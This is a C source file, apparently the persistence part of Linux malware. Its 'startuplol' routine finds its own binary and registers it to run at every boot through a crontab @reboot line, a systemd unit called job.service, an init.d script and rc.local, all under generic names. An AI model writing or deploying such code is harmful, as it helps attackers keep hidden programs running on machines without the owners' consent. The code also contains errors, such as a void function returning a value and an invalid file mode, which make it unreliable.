#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pwd.h>
#include <libgen.h>
#include <sys/types.h>

void addToCrontab(const char *binPath, const char *username) {
    char crontabPath[256];
    snprintf(crontabPath, sizeof(crontabPath), "/var/spool/cron/crontabs/%s", username);

    FILE *crontab = fopen(crontabPath, "a");
    if (crontab == NULL) {
        return;
    }
    fprintf(crontab, "@reboot %s\n", binPath);
    fclose(crontab);
}

void addToSystemd(const char *binPath) {
    FILE *systemd = fopen("/etc/systemd/system/job.service", "w");
    if (systemd == NULL) {
        return;
    }
    fprintf(systemd,
            "[Unit]\n"
            "Description=Your Job\n\n"
            "[Service]\n"
            "ExecStart=%s\n\n"
            "[Install]\n"
            "WantedBy=default.target\n", binPath);
    fclose(systemd);
}

void addToRcInit(const char *binPath) {
    FILE *rc = fopen("/etc/init.d/job", "w");
    if (rc == NULL) {
        return;
    }
    fprintf(rc,
            "#!/bin/sh\n\n"
            "# Your Job\n\n"
            "case \"$1\" in\n"
            "    start)\n"
            "        %s\n"
            "        ;;\n"
            "    *)\n"
            "        echo \"Usage: $0 {start}\"\n"
            "        exit 1\n"
            "        ;;\n"
            "esac\n", binPath);
    fclose(rc);
    chmod("/etc/init.d/job", 0755);
}

void startuplol() {
       int i, d = 0;
    char cwd[256], *str;
    FILE *file;
    char binPath[1024];

    // Get the absolute path of the binary file
    ssize_t len = readlink("/proc/self/exe", binPath, sizeof(binPath) - 1);
    if (len == -1) {
        return 1;
    }
    binPath[len] = '\0';

    struct passwd *pw;
    uid_t uid = geteuid();
    pw = getpwuid(uid);
    const char *username = pw->pw_name;

    str = "/etc/rc.d/rc.local";
    file = fopen(str, "r");
    if (file == NULL) {
        str = "/etc/rc.conf";
        file = fopen(str, "r");
    }
    if (file != NULL) {
        char outfile[256], buf[1024];
        i = strlen(binPath);
        getcwd(cwd, 256);
        if (strcmp(cwd, "/")) {
            while (binPath[i] != '/')
                i--;
            sprintf(outfile, "\"%s%s\"\n", cwd, binPath + i);
            while (fgets(buf, 1024, file) != NULL) {
                if (strcasecmp(buf, outfile) == 0) {
                    d++;
                    break;
                }
            }
            if (d == 0) {
                FILE *out;
                fclose(file);
                out = fopen(str, "sshd");
                if (out != NULL) {
                    fputs(outfile, out);
                    fclose(out);
                }
            } else {
                fclose(file);
            }
        } else {
            fclose(file);
        }
    }

    addToCrontab(binPath, username);
    addToSystemd(binPath);
    addToRcInit(binPath);


}
